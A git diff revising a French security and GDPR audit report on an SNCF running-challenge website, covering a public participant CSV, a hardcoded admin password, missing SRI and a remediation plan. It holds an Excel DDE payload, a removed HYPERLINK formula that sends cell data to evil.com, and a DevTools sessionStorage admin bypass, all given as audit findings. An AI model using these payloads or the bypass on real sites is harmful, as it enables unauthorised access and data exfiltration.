-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
 }
 ```
-✅ Implémentation correcte
 
-**Mais usage via innerHTML (verify.js:117) :**
-```javascript
-el.innerHTML = html;  // ⚠️ Risque si escapeHtml() n'est pas appelé partout
-```
+Son usage via `innerHTML` (verify.js:117) reste un pattern risqué si le code évolue, mais il est actuellement sûr.
 
-**Usage non sécurisé identifié dans script.js :**
-```javascript
-// Plusieurs occurrences d'innerHTML sans sanitisation garantie (lignes 142, 149, 156)
-element.innerHTML = buildCardHtml(participant);
-```
+### Injection Excel
 
-### Validation de fichier Excel — Manques
+Les formules Excel (`=cmd|'/c calc'!A1`) ne sont pas exécutées par SheetJS en JavaScript. Le risque existe uniquement si les données exportées sont ouvertes dans Excel/Google Sheets sans sanitisation préalable.
 
-```javascript
-// script.js:378 — Aucune validation de schéma
-const data = XLSX.utils.sheet_to_json(ws, { defval: '' });
-parseParticipants(data);  // Données utilisées directement sans validation
-```
-
-**Problèmes :**
-- Pas de limite de taille de fichier
-- Pas de validation du schéma (colonnes attendues vs présentes)
-- Pas de vérification des types de données
-- Injection Excel possible : `=cmd|'/c calc'!A1` dans une cellule → risque si réexporté en CSV ouvert dans Excel
-
-**Remédiation :**
-- Remplacer `innerHTML` par `textContent` pour les contenus textuels
-- Implémenter une validation de schéma (ex. vérifier la présence des colonnes `ID`, `NOM`, `PRÉNOM`)
-- Limiter la taille des fichiers uploadés (max 10 Mo)
-- Valider les types et formats de chaque champ avant traitement
+**Remédiation minimale** : préfixer les valeurs commençant par `=`, `+`, `-`, `@` avec une apostrophe lors de l'export CSV.
 
 ---
 
-## 11. Gestion des erreurs et fuite d'informations
+## 10. Dépendances et bibliothèques externes
 
-### Messages d'erreur exposés
+| Bibliothèque | Version | Vulnérabilités connues | SRI |
+|-------------|---------|----------------------|-----|
+| SheetJS (xlsx) | 0.18.5 | Aucune critique connue | ❌ |
+| html2canvas | 1.4.1 | Aucune critique connue | ❌ |
+| Google Fonts | Latest | Aucune | N/A |
+| Tally Embed | Latest | Inconnue | ❌ |
 
-**verify.js (lignes 131-165) :**
-```javascript
-setStatus('error', `
-  <small>${escapeHtml(csvError)}</small>  // ← Message d'erreur brut affiché
-`);
-```
-
-**Exemples de fuites possibles :**
-- `"HTTP 404"` → révèle que le fichier n'existe pas
-- `"Failed to fetch"` → révèle la configuration réseau
-- Erreurs de parsing avec numéros de ligne → révèle la structure du CSV
-
-**Remédiation :**
-```javascript
-// Mauvais
-setStatus('error', `Erreur: ${escapeHtml(csvError)}`);
-
-// Bon
-console.error('[AUDIT]', csvError);  // Log côté développeur
-setStatus('error', 'Impossible de charger les données. Contactez l\'organisateur.');
-```
+Action recommandée : ajouter les hashes SRI (voir section 7).
 
 ---
 
-## 12. Dépendances et bibliothèques externes
+## 11. Conformité RGPD article par article
 
-### Bibliothèques utilisées
+| Article | Intitulé | Statut | Problème |
+|---------|---------|--------|---------|
+| **Art. 5** | Principes | ⚠️ PARTIEL | Limitation conservation non respectée (CSV sans expiration) |
+| **Art. 6** | Licéité | ❌ NON | Base légale non documentée formellement |
+| **Art. 13/14** | Information | ❌ NON | Pas de politique de confidentialité dédiée |
+| **Art. 15** | Droit d'accès | ⚠️ PARTIEL | Email fourni, pas de procédure formelle |
+| **Art. 17** | Droit à l'effacement | ❌ NON | Aucun mécanisme de suppression |
+| **Art. 20** | Portabilité | ❌ NON | Pas d'export pour les personnes |
+| **Art. 25** | Privacy by design | ❌ NON | Anonymisation CSV insuffisante |
+| **Art. 28** | Sous-traitant | ❌ NON | Pas de DPA visible avec Microsoft ni Tally |
+| **Art. 30** | Registre des traitements | ❌ NON | Non constitué |
+| **Art. 32** | Sécurité | ⚠️ PARTIEL | CSV public sans auth (corrigé si section 4 traité) |
+| **Art. 33** | Notification violation | ❌ NON | Pas de procédure documentée |
+| **Art. 35** | AIPD | ❌ NON | Non réalisée |
 
-| Bibliothèque | Version | Source | SRI | Vulnérabilités connues |
-|-------------|---------|--------|-----|----------------------|
-| **SheetJS (xlsx)** | 0.18.5 | cdnjs | ❌ Non | Aucune critique connue |
-| **html2canvas** | 1.4.1 | cdnjs | ❌ Non | Aucune critique connue |
-| **Google Fonts** | Latest | googleapis.com | N/A | Aucune |
-| **Tally Embed** | Latest | tally.so | ❌ Non | Inconnue |
-
-### Risques
-
-- **Absence de SRI** : Un attaquant compromettant le CDN peut injecter du code malveillant
-- **Version fixe mais non vérifiée** : `0.18.5` est spécifié mais aucun hash ne garantit l'intégrité
-- **Tally embed script** : Version non épinglée, mise à jour automatique possible
-
-### Actions à réaliser
-
-1. Calculer les hashes SRI pour chaque script externe
-2. Mettre à jour SheetJS (vérifier les versions 0.20+)
-3. Envisager de self-héberger les bibliothèques critiques
+> ℹ️ La majorité des non-conformités sont **documentaires** (politique de confidentialité, registre, DPA) et ne reflètent pas nécessairement des pratiques incorrectes — elles ne sont simplement pas formalisées.
 
 ---
 
-## 13. Secrets et identifiants codés en dur
+## 12. Documents légaux et politique de confidentialité
 
-### Identifiants trouvés
+### CGU existantes (cgu.html) — lacunes
 
-| Fichier | Ligne | Valeur | Risque |
-|---------|-------|--------|--------|
-| [admin.html](admin.html) | 54 | `'cc2026admin'` | 🔴 CRITIQUE |
-| [resultats.html](resultats.html) | 291 | `'cc2026admin'` | 🔴 CRITIQUE |
-| [index.html](index.html) | 426 | ID groupe Viva Engage encodé en base64 | 🟡 MOYEN |
-
-**Viva Engage URL (index.html:426) :**
-```
-eyJfdHlwZSI6Ikdyb3VwIiwiaWQiOiI2Nzg4NTg4In0
-→ Décodé : {"_type":"Group","id":"6788588"}
-```
-
-Expose la structure interne des groupes SNCF.
-
-### Identifiant Microsoft Forms
-
-**inscription.html:69 :**
-```
-?id=OIJ8SplXFkufxprY_OWn2d7Qab57piJJu3lLE68KpuFUMzlDS0NQRkk5WUY1R1U4UVhWNUM2VzBXOCQlQCN0PWcu
-```
-
-Cet ID de formulaire est public mais révèle l'identifiant interne de l'organisation Microsoft 365 de SNCF.
-
----
-
-## 14. Rétention et suppression des données
-
-### État actuel
-
-| Stockage | Durée | Expiration auto | Suppression utilisateur |
-|---------|-------|-----------------|------------------------|
-| CSV GitHub | **Indéfinie** | ❌ Non | ❌ Non |
-| localStorage | **Indéfinie** | ❌ Non | ❌ Non |
-| sessionStorage | Session navigateur | ✅ Oui | N/A |
-| Microsoft Forms | Inconnue (>30 j) | ❌ Inconnue | ❌ Non disponible |
-| Tally.so | Inconnue | ❌ Inconnue | ❌ Non disponible |
-
-### Ce qui manque
-
-- **Politique de rétention documentée** (obligatoire Article 13 RGPD)
-- **Suppression automatique** après la fin de l'événement (J+30 recommandé)
-- **Mécanisme de demande d'effacement** pour les participants (Article 17 RGPD)
-- **Procédure de suppression du CSV** après archivage sécurisé
-
-### Durée de rétention recommandée
-
-| Donnée | Durée recommandée | Justification |
-|--------|------------------|---------------|
-| Données d'inscription | J+30 après l'événement | Gestion des réclamations post-événement |
-| Résultats anonymisés | 1 an | Historique sportif |
-| Photos de preuves | J+30 après validation | Vérification uniquement |
-| Journaux d'accès | 6 mois | Sécurité (Article 32) |
-
----
-
-## 15. Documents légaux et politique de confidentialité
-
-### Documents existants
-
-#### CGU (cgu.html) — État actuel
-- ✅ Mentionne le RGPD (Article 4 des CGU)
-- ✅ Fournit un email de contact `sorunningsncf@sncf.fr`
-- ❌ Ne liste **pas** tous les champs collectés (âge, sexe, région, société manquants)
-- ❌ Ne précise **pas** la durée de conservation
-- ❌ Ne mentionne **pas** les sous-traitants (Microsoft, Tally)
-- ❌ Ne mentionne **pas** les cookies et traceurs
-- ❌ Ne définit **pas** la base légale du traitement
-- ❌ Ne décrit **pas** comment exercer les droits RGPD (Article 17, 20, 21)
-
-#### Règlement (reglement.html)
-- Document sportif (12 articles) — non concerné par les obligations de confidentialité
+- ✅ Mentionne le RGPD et fournit un email de contact
+- ❌ Ne liste pas tous les champs collectés (âge, sexe, région, société absents)
+- ❌ Ne précise pas la durée de conservation
+- ❌ Ne mentionne pas les sous-traitants (Microsoft, Tally)
+- ❌ Ne mentionne pas les cookies tiers
 
 ### Documents manquants
 
 | Document | Obligatoire | Priorité |
 |---------|------------|---------|
-| **Politique de confidentialité** | ✅ Article 13/14 RGPD | 🔴 CRITIQUE |
-| **DPA avec Microsoft** | ✅ Article 28 RGPD | 🔴 CRITIQUE |
-| **DPA avec Tally** | ✅ Article 28 RGPD | 🔴 CRITIQUE |
-| **Registre des traitements** | ✅ Article 30 RGPD | 🟠 ÉLEVÉ |
-| **AIPD / DPIA** | ✅ Article 35 RGPD (traitement à risque) | 🟠 ÉLEVÉ |
-| **Plan de réponse aux incidents** | ✅ Article 33 RGPD | 🟠 ÉLEVÉ |
-| **Politique de cookies** | ✅ Loi LCEN + RGPD | 🟠 ÉLEVÉ |
+| Politique de confidentialité dédiée | ✅ Art. 13/14 | 🟠 ÉLEVÉ |
+| DPA avec Microsoft | ✅ Art. 28 | 🟠 ÉLEVÉ |
+| DPA avec Tally | ✅ Art. 28 | 🟠 ÉLEVÉ |
+| Registre des traitements | ✅ Art. 30 | 🟡 MOYEN |
+| Politique de cookies | ✅ LCEN + RGPD | 🟡 MOYEN |
+| Plan de réponse aux incidents | ✅ Art. 33 | 🟡 MOYEN |
 
 ---
 
-## 16. Scénarios d'attaque
+## 13. Scénarios d'attaque réalistes
 
-### Scénario 1 — Exfiltration du CSV participant (Probabilité : TRÈS ÉLEVÉE)
+### Scénario 1 — Exfiltration CSV (Probabilité : ÉLEVÉE / Impact : ÉLEVÉ)
 
 ```
-1. Attaquant accède à l'URL du CSV (publique, pas d'auth)
-2. Télécharge participants_anonymises_Challenge_Connecté_2026.csv
-3. Croise première lettre + domaine email + région → réidentification
-4. Résultat : 795+ profils de salariés SNCF identifiés
+1. Accès direct à l'URL du CSV (publique, aucune auth)
+2. Téléchargement en 1 requête HTTP
+3. Croisement annuaire SNCF → réidentification partielle des 795 participants
 ```
-
-**Impact :** Violation de données massives, notification CNIL obligatoire sous 72h (Article 33)
+**C'est le seul scénario vraiment réaliste avec impact sur des données personnelles.**
 
 ---
 
-### Scénario 2 — Contournement de l'authentification admin (Probabilité : TRÈS ÉLEVÉE)
+### Scénario 2 — Bypass admin (Probabilité : ÉLEVÉE / Impact : FAIBLE)
 
 ```
-1. Attaquant ouvre admin.html
-2. F12 → Console → sessionStorage.setItem('admin_ok', '1')
-3. Accès complet : liste participants, génération dossards, export CSV
-4. Export de la liste complète avec données PII en clair
+1. DevTools → sessionStorage.setItem('admin_ok', '1')
+2. Interface admin accessible
+3. Sans fichier Excel → aucune PII visible
+4. Seules données lisibles : ID → dossard en localStorage (non nominatif)
 ```
-
-**Impact :** Accès non autorisé à toutes les données personnelles
+**Impact réel quasi nul sans le fichier Excel.**
 
 ---
 
-### Scénario 3 — Énumération brute des participants (Probabilité : ÉLEVÉE)
+### Scénario 3 — Supply chain CDN (Probabilité : FAIBLE / Impact : ÉLEVÉ)
 
 ```
-1. Script automatisé boucle sur IDs 1 à 1000
-2. Pour chaque ID : requête à verify.html + lecture CSV
-3. Aucune limitation de débit → terminé en < 5 minutes
-4. Collecte de tous les profils masqués
+1. Compromission de cdnjs.cloudflare.com
+2. Code malveillant injecté dans xlsx.full.min.js
+3. Lors d'une session admin avec Excel uploadé : exfiltration des PII en mémoire
 ```
-
-**Code d'attaque exemple :**
-```python
-import requests
-for id in range(1, 1000):
-    # Requête directe au CSV + recherche par ID
-    # → collecte toutes les données
-```
+**Mitigé par l'ajout de SRI.**
 
 ---
 
-### Scénario 4 — Attaque supply chain via CDN (Probabilité : FAIBLE, Impact : CRITIQUE)
+### Scénario 4 — Injection Excel (Probabilité : TRÈS FAIBLE / Impact : FAIBLE)
 
 ```
-1. Compromise de cdnjs.cloudflare.com
-2. Injection de code malveillant dans xlsx.full.min.js
-3. À l'ouverture de admin.html, le code malveillant s'exécute
-4. Exfiltration de tous les fichiers Excel uploadés vers un serveur attaquant
+1. Fichier Excel piégé fourni à l'admin (ingénierie sociale)
+2. Upload dans admin.html
+3. SheetJS ne les exécute pas → risque uniquement si réexport CSV ouvert dans Excel
 ```
-
-**Prévention : SRI (Subresource Integrity) — voir section 12**
+**Risque négligeable dans ce contexte.**
 
 ---
 
-### Scénario 5 — Injection Excel (Probabilité : MOYENNE)
+## 14. Évaluation fichier par fichier
 
-```
-1. Attaquant prépare un fichier Excel avec des formules malveillantes
-2. Admin télécharge ce fichier "participant" piégé
-3. L'app le traite via SheetJS
-4. Si les données sont réexportées en CSV et ouvertes dans Excel :
-   =HYPERLINK("https://evil.com/"&A1,"Cliquez ici") → exfiltration
-```
-
----
-
-## 17. Cartographie OWASP Top 10
-
-| Risque OWASP | Constat | Sévérité | Fichier:Ligne |
-|-------------|---------|----------|--------------|
-| **A01 — Broken Access Control** | Mot de passe hardcodé, contournement DevTools | 🔴 CRITIQUE | admin.html:54 |
-| **A02 — Cryptographic Failures** | localStorage en clair, CSV public | 🔴 CRITIQUE | script.js:219 |
-| **A03 — Injection** | innerHTML avec données non totalement sanitisées | 🟠 ÉLEVÉ | verify.js:117 |
-| **A04 — Insecure Design** | Pas d'architecture d'authentification | 🔴 CRITIQUE | Global |
-| **A05 — Security Misconfiguration** | Pas de CSP, pas de SRI, pas d'en-têtes | 🟠 ÉLEVÉ | Tous HTML |
-| **A06 — Vulnerable/Outdated Components** | Pas de SRI, versions non vérifiées | 🟡 MOYEN | admin.html:7-8 |
-| **A07 — Auth & Session Management** | Auth client uniquement, pas de MFA | 🔴 CRITIQUE | admin.html:54-69 |
-| **A08 — Data Integrity Failures** | Pas d'intégrité sur le CSV, pas de SRI | 🟠 ÉLEVÉ | data/ |
-| **A09 — Logging & Monitoring** | Aucun journal d'accès ni d'audit | 🟠 ÉLEVÉ | Global |
-| **A10 — SSRF** | Formulaires externes sans validation | 🟡 MOYEN | inscription.html:69 |
+| Fichier | Risque | Problèmes |
+|---------|--------|----------|
+| [index.html](index.html) | 🟢 FAIBLE | Liens externes, URL Viva Engage expose ID groupe |
+| [inscription.html](inscription.html) | 🟡 MOYEN | Iframe Microsoft sans bannière consentement |
+| [verify.html](verify.html) | 🔴 CRITIQUE | Charge le CSV public sans auth |
+| [admin.html](admin.html) | 🟡 MOYEN | Mot de passe client-side, SRI absent |
+| [depot.html](depot.html) | 🟡 MOYEN | Tally sans SRI, sans bannière consentement |
+| [resultats.html](resultats.html) | 🟡 MOYEN | Même auth faible qu'admin ; risque si résultats nominatifs uploadés |
+| [reglement.html](reglement.html) | 🟢 FAIBLE | Document statique, aucun problème |
+| [cgu.html](cgu.html) | 🟡 MOYEN | Incomplète (voir section 12) |
+| [script.js](script.js) | 🟡 MOYEN | innerHTML, pas de validation schéma Excel |
+| [verify.js](verify.js) | 🟡 MOYEN | escapeHtml OK mais innerHTML, CSV sans auth |
+| [style.css](style.css) | 🟢 FAIBLE | Aucun problème |
+| [config.json](config.json) | 🟢 FAIBLE | Feature flags publics, pas de secrets |
 
 ---
 
-## 18. Évaluation fichier par fichier
+## 15. Plan de remédiation priorisé
 
-### [index.html](index.html) — 🟡 FAIBLE-MOYEN
-- Pas de traitement de données
-- Liens externes (Strava, WhatsApp, Viva Engage)
-- **Problème** : URL Viva Engage expose l'ID groupe SNCF (ligne 426)
+### Phase 1 — Urgent (1 à 2 semaines)
 
-### [inscription.html](inscription.html) — 🟡 MOYEN
-- Iframe Microsoft Forms
-- Pas de traitement local
-- **Problème** : Pas de bannière de consentement préalable à l'affichage du formulaire
+#### 1.1 Sécuriser ou supprimer le CSV public
 
-### [verify.html](verify.html) — 🟠 ÉLEVÉ
-- Charge et expose le CSV public
-- Recherche par ID séquentiel (énumérable)
-- `escapeHtml()` présent mais `innerHTML` utilisé
-- **Problème principal** : CSV accessible sans authentification
+**Priorité absolue — seul vrai risque de fuite de données.**
 
-### [admin.html](admin.html) — 🔴 CRITIQUE
-- Mot de passe hardcodé (ligne 54)
-- Upload et traitement Excel avec PII
-- Stockage localStorage non chiffré
-- Export CSV avec données complètes
-- **Action requise** : Réécriture complète avec auth serveur
-
-### [depot.html](depot.html) — 🟡 MOYEN
-- Embed Tally.so
-- Affichage conditionnel via `config.json`
-- **Problème** : Pas de SRI sur le script Tally (ligne 7)
-
-### [resultats.html](resultats.html) — 🔴 CRITIQUE
-- Mêmes problèmes qu'`admin.html` (mot de passe hardcodé ligne 291)
-- Charge des fichiers CSV via upload
-- **Action requise** : Réécriture avec auth serveur
-
-### [reglement.html](reglement.html) — 🟢 FAIBLE
-- Document statique, aucun problème de sécurité
-
-### [cgu.html](cgu.html) — 🟡 MOYEN
-- Document légal insuffisant (voir section 15)
-- **Action requise** : Compléter avec politique de confidentialité détaillée
-
-### [script.js](script.js) — 🟠 ÉLEVÉ
-- 2411 lignes de logique admin
-- Pas de validation de schéma (ligne 378)
-- `innerHTML` utilisé (lignes 142, 149, 156)
-- localStorage non chiffré (lignes 219-240)
-- Construction d'URL `mailto:` avec données personnelles (ligne ~1857)
-
-### [verify.js](verify.js) — 🟡 MOYEN
-- `escapeHtml()` implémenté ✅
-- `innerHTML` utilisé malgré sanitisation (ligne 117)
-- CSV chargé sans authentification (ligne 70)
-
----
-
-## 19. Plan de remédiation priorisé
-
-### Phase 1 — Urgences (sous 1 semaine)
-
-#### 1.1 Sécuriser l'accès admin et résultats
-
-**Effort :** 4-8 heures  
-**Impact :** Élimine la vulnérabilité la plus critique
-
-Option A (minimale, GitHub Pages) : HTTP Basic Auth via un fichier `.htaccess` sur un serveur dédié, ou redirection vers une page d'accès protégée par token.
-
-Option B (recommandée) : Migrer vers un backend minimal (Vercel/Netlify Functions) avec authentification OAuth2 SNCF.
-
-```javascript
-// SUPPRIMER IMMÉDIATEMENT :
-const MDP = 'cc2026admin';
-
-// REMPLACER PAR (Option A — solution intermédiaire) :
-// Mettre admin.html derrière un proxy avec authentification serveur
-// OU utiliser un token aléatoire généré côté serveur
-```
-
-#### 1.2 Sécuriser l'accès au CSV
-
-**Effort :** 2-4 heures  
-**Impact :** Empêche l'exfiltration massive des données
+Option A (la plus simple) : **supprimer le CSV du dépôt public** et remplacer la vérification par un lien individuel envoyé par email à chaque participant.
 
 ```
-Options :
-A. Déplacer le CSV derrière une API sécurisée (Netlify/Vercel Functions)
-B. Exiger un token d'accès dans la requête de téléchargement
-C. Hacher les données avec un salt connu seulement du serveur
+Email participant : "Votre lien de vérification : https://sorunning.../verify?token=abc123xyz"
+→ Token unique, non devinable, non énumérable
+→ Plus besoin de CSV public
 ```
 
-#### 1.3 Ajouter une politique de confidentialité
+Option B : passer le CSV derrière une Netlify/Vercel Function qui demande l'ID + une clé de session.
 
-**Effort :** 4-8 heures  
-**Impact :** Conformité RGPD minimale
+**Nettoyer l'historique Git :**
+```bash
+# Supprimer le CSV de tout l'historique Git
+git filter-repo --path data/participants_anonymises_Challenge_Connecté_2026.csv --invert-paths
+git push origin --force
+```
 
-La politique doit inclure :
-- Finalité du traitement
-- Base légale (consentement lors de l'inscription)
-- Données collectées (liste exhaustive)
-- Destinataires (Microsoft, Tally, équipe organisatrice)
-- Durée de conservation (proposée : 30 jours après l'événement)
-- Droits des personnes (accès, rectification, suppression, portabilité)
-- Contact DPO ou référent RGPD SNCF
-- Droit de saisir la CNIL
+#### 1.2 Changer le mot de passe admin
+
+Remplacer `cc2026admin` par un token aléatoire long, communiqué hors du dépôt Git :
+
+```bash
+openssl rand -base64 24
+# → Ex : "k7Hq2mXpL9vRnT4wBcYeJd8sAz"
+```
+
+Ne pas committer ce token. Le changer après chaque événement.
 
 ---
 
 ### Phase 2 — Court terme (1 mois)
 
-#### 2.1 Ajouter SRI sur toutes les ressources externes
+#### 2.1 Politique de confidentialité
 
-**Effort :** 2 heures
+Créer une page dédiée `confidentialite.html` incluant :
+- Données collectées (liste exhaustive)
+- Base légale (consentement à l'inscription)
+- Destinataires (Microsoft, Tally, équipe organisatrice)
+- Durée de conservation (proposée : J+30 après événement)
+- Droits des personnes (accès, rectification, suppression)
+- Contact : `sorunningsncf@sncf.fr`
+- Droit de saisir la CNIL
+
+#### 2.2 Bannière de consentement cookies
+
+Chargement conditionnel des iframes Microsoft et Tally après acceptation :
+
+```javascript
+document.getElementById('acceptCookies').addEventListener('click', () => {
+  localStorage.setItem('cookies_accepted', '1');
+  loadThirdPartyIframes(); // charge les iframes Microsoft et Tally
+});
+```
+
+#### 2.3 Ajouter SRI sur les scripts CDN
 
 ```bash
-# Générer les hashes SRI
-curl -s https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js | openssl dgst -sha384 -binary | openssl base64 -A
+# Calculer le hash
+curl -s https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js \
+  | openssl dgst -sha384 -binary | openssl base64 -A
 ```
 
 ```html
-<!-- admin.html -->
-<script 
-  src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
-  integrity="sha384-HASH_ICI"
-  crossorigin="anonymous">
-</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
+  integrity="sha384-[HASH]" crossorigin="anonymous"></script>
 ```
 
-#### 2.2 Ajouter une bannière de consentement aux cookies
+#### 2.4 En-têtes de sécurité via Cloudflare
 
-**Effort :** 4-8 heures
-
-```html
-<!-- Bannière RGPD minimale conforme CNIL -->
-<div id="cookie-banner" style="position:fixed;bottom:0;width:100%;background:#1a1a2e;color:#fff;padding:1rem;z-index:9999">
-  <p>Ce site utilise des cookies fonctionnels. Des services tiers (Microsoft Forms, Tally.so) peuvent également en déposer.
-  <a href="/cgu.html#cookies">En savoir plus</a></p>
-  <button onclick="acceptCookies()">Accepter</button>
-  <button onclick="refuseCookies()">Refuser</button>
-</div>
-```
-
-#### 2.3 Renforcer la validation des données Excel
-
-**Effort :** 8-16 heures
-
-```javascript
-// Schéma de validation à implémenter dans script.js
-const SCHEMA = {
-  required: ['ID', 'NOM', 'PRÉNOM', 'EMAIL'],
-  maxRows: 2000,
-  maxFileSizeMB: 10,
-  fields: {
-    'ID': { type: 'number', min: 1, max: 9999 },
-    'EMAIL': { pattern: /^[^@]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/ },
-    'SEXE': { enum: ['M', 'F', ''] },
-    'AGE': { type: 'number', min: 16, max: 99 }
-  }
-};
-
-function validateData(data) {
-  if (data.length > SCHEMA.maxRows) throw new Error(`Fichier trop volumineux (max ${SCHEMA.maxRows} lignes)`);
-  // ... validation par champ
-}
-```
-
-#### 2.4 Remplacer innerHTML par textContent
-
-**Effort :** 4 heures
-
-```javascript
-// Mauvais
-element.innerHTML = `<strong>${escapeHtml(name)}</strong>`;
-
-// Bon
-const el = document.createElement('strong');
-el.textContent = name;  // Pas de risque XSS, même sans escapeHtml
-element.appendChild(el);
-```
-
-#### 2.5 Ajouter des en-têtes de sécurité via Cloudflare
-
-**Effort :** 2 heures (configuration Cloudflare)
-
-Mettre en place Cloudflare (plan gratuit) et configurer les règles de transformation :
+Configurer Cloudflare (plan gratuit) devant GitHub Pages et ajouter via les règles de transformation :
 
 ```
-Content-Security-Policy: default-src 'self'; script-src 'self' cdnjs.cloudflare.com tally.so 'nonce-RANDOM'; frame-src forms.office.com tally.so; style-src 'self' fonts.googleapis.com 'unsafe-inline'; font-src fonts.gstatic.com
+Content-Security-Policy: default-src 'self'; script-src 'self' cdnjs.cloudflare.com tally.so; frame-src forms.office.com tally.so; style-src 'self' fonts.googleapis.com 'unsafe-inline'; font-src fonts.gstatic.com
 X-Frame-Options: SAMEORIGIN
 X-Content-Type-Options: nosniff
 Referrer-Policy: strict-origin-when-cross-origin
@@ -963,108 +565,56 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 ### Phase 3 — Moyen terme (3 mois)
 
-#### 3.1 Migration vers un backend sécurisé
+#### 3.1 Établir les DPA avec Microsoft et Tally
 
-**Effort :** 100-200 heures  
-**Technologie recommandée :** Node.js + Express (ou Bun + Hono) sur Fly.io ou Railway (EU)
+- Vérifier si un accord Microsoft est déjà en place au niveau SNCF (probable via le contrat Microsoft 365 entreprise)
+- Contacter Tally.so pour obtenir leur DPA RGPD et vérifier la résidence des données en UE
 
-Architecture cible :
+#### 3.2 Constituer le registre des traitements (Article 30)
+
+Document interne listant : finalité, base légale, catégories de données, destinataires, durée de conservation, mesures de sécurité.
+
+#### 3.3 Définir une politique de purge
+
 ```
-Participants → Frontend (GitHub Pages)
-                    │
-                    ▼
-             API Backend (Node.js)
-                    │
-             ┌──────┴──────┐
-             │             │
-        PostgreSQL      Redis
-        (données)    (sessions/rate limiting)
-             │
-        Chiffrement AES-256
-```
-
-Fonctionnalités à implémenter :
-- [ ] Authentification OAuth2 via SNCF Entra ID
-- [ ] Sessions serveur avec expiration
-- [ ] Rate limiting (ex: 10 requêtes/minute par IP)
-- [ ] Chiffrement des données au repos
-- [ ] Journalisation d'audit (qui, quand, quelle action)
-- [ ] API RGPD : endpoint de suppression de compte
-- [ ] Purge automatique 30 jours après l'événement
-
-#### 3.2 Réaliser une AIPD (Analyse d'Impact sur la Protection des Données)
-
-**Effort :** 20-40 heures (avec le DPO SNCF)
-
-Obligatoire car le traitement présente des risques élevés (Article 35 RGPD) :
-- Large volume de personnes (800+)
-- Données sensibles (santé inférée, photos)
-- Employeur impliqué (relation de pouvoir)
-
-#### 3.3 Établir des DPA avec Microsoft et Tally
-
-- Vérifier l'Addendum de Protection des Données Microsoft (déjà en place pour SNCF ?)
-- Obtenir un DPA Tally.so conforme RGPD (résidence des données en UE)
-- Documenter ces accords dans le registre des traitements
-
-#### 3.4 Mettre en place un plan de réponse aux incidents
-
-Procédure à documenter :
-```
-1. Détection : Qui surveille ? (alerte SIEM, signalement utilisateur)
-2. Qualification : Gravité, périmètre, données concernées
-3. Containment : Actions immédiates (bloquer accès, couper endpoint)
-4. Notification CNIL : Sous 72h si violation (Article 33 RGPD)
-5. Notification personnes : Si risque élevé (Article 34 RGPD)
-6. Remédiation : Correction des causes racines
-7. Post-mortem : Rapport et mise à jour des procédures
+Données d'inscription     → suppression J+30 après la remise des récompenses
+Résultats anonymisés      → conservation 1 an maximum
+Photos de preuves (Tally) → demander suppression à Tally J+30
 ```
 
 ---
 
-## Annexe A — Checklist de remédiation
+## Annexe — Checklist de remédiation
 
-### Sécurité
+### Sécurité technique
 
-- [ ] Supprimer les mots de passe hardcodés (`admin.html:54`, `resultats.html:291`)
-- [ ] Implémenter une authentification côté serveur
-- [ ] Ajouter le MFA pour l'accès admin
-- [ ] Sécuriser l'accès au CSV (authentification obligatoire)
-- [ ] Ajouter SRI sur toutes les ressources externes
-- [ ] Configurer les en-têtes HTTP de sécurité
-- [ ] Ajouter un rate limiting sur la vérification par ID
+- [ ] Supprimer le CSV public et purger l'historique Git
+- [ ] Remplacer le mot de passe `cc2026admin` par un token aléatoire hors dépôt
+- [ ] Ajouter SRI sur SheetJS et html2canvas
+- [ ] Configurer les en-têtes HTTP de sécurité (via Cloudflare)
 - [ ] Remplacer `innerHTML` par `textContent` dans verify.js et script.js
-- [ ] Chiffrer les données sensibles en localStorage
-- [ ] Ajouter une validation de schéma sur l'upload Excel
-- [ ] Implémenter des journaux d'audit
+- [ ] Ajouter sanitisation anti-injection Excel à l'export CSV
 
-### RGPD
+### RGPD et conformité
 
 - [ ] Créer une politique de confidentialité dédiée
-- [ ] Mettre à jour les CGU avec la liste complète des données collectées
-- [ ] Spécifier les durées de rétention
-- [ ] Ajouter une bannière de consentement aux cookies
-- [ ] Implémenter un mécanisme de suppression des données (Article 17)
-- [ ] Établir un DPA avec Microsoft Forms
-- [ ] Établir un DPA avec Tally.so
+- [ ] Mettre à jour les CGU avec données et durées complètes
+- [ ] Ajouter une bannière de consentement cookies
+- [ ] Vérifier/établir DPA avec Microsoft (contrat SNCF existant ?)
+- [ ] Établir DPA avec Tally.so
 - [ ] Constituer le registre des traitements (Article 30)
-- [ ] Réaliser une AIPD (Article 35)
-- [ ] Identifier et documenter le contact DPO
-- [ ] Supprimer l'historique Git du CSV (`git filter-repo`)
-- [ ] Définir et appliquer une politique de purge automatique
+- [ ] Définir et appliquer une politique de purge post-événement
 
 ---
 
-## Annexe B — Ressources
+## Ressources
 
-- [CNIL — Guides pratiques RGPD](https://www.cnil.fr/fr/rgpd-par-ou-commencer)
-- [CNIL — Modèle de politique de confidentialité](https://www.cnil.fr/fr/modeles/outil/generateur-de-mentions-dinformation)
-- [OWASP — Top 10](https://owasp.org/www-project-top-ten/)
+- [CNIL — Générateur de mentions d'information](https://www.cnil.fr/fr/modeles/outil/generateur-de-mentions-dinformation)
+- [CNIL — Guide sécurité des données](https://www.cnil.fr/fr/la-securite-des-donnees)
 - [SRI Hash Generator](https://www.srihash.org/)
-- [CNIL — Référentiel de sécurité](https://www.cnil.fr/fr/la-securite-des-donnees)
-- [Guide Microsoft DPA](https://www.microsoft.com/fr-fr/trust-center/privacy/gdpr-data-subject-requests)
+- [git filter-repo](https://github.com/newren/git-filter-repo)
 
 ---
 
-*Rapport généré le 2026-04-11 — Analyse statique automatisée du code source (23 fichiers, 7 113 lignes)*  
-*Ce rapport ne se substitue pas à un audit de sécurité professionnel ni à un conseil juridique. Il est recommandé de le faire valider par le DPO et l'équipe cybersécurité SNCF.*
+*Rapport généré le 2026-04-11 — Analyse statique du code source (23 fichiers, 7 113 lignes)*  
+*Ce rapport ne se substitue pas à un audit professionnel ni à un conseil juridique.*
